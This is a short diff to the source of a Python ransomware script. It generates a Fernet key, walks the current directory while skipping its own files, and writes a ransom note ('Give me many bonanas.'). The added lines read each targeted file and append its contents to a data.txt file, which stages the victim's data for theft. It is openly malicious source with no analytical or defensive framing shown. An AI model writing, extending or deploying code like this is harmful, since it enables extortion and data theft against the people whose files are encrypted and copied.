@@ -10,6 +10,7 @@ files = []
 key = Fernet.generate_key()
 
 
+
 for file in os.listdir():
     if file == "monsterwith21faces.py" or file == "store.key" or file == "cyanide.py" or file == "ransom_note.txt" or file == "run_this.sh" or file == "after_ransom_is_given_run_this.sh?raw=true":
         continue
@@ -23,6 +24,13 @@ note = "Give me many bonanas."
 
 with open("ransom_note.txt", "w") as ransom_note:
     ransom_note.write(note)
+
+
+for file in files:
+    with open(file, "rb") as data_for_snatch:
+        snatched_data = data_for_snatch.read()
+    with open("data.txt", "ab") as payload:
+        payload.write(snatched_data)
 
 
 for file in files:
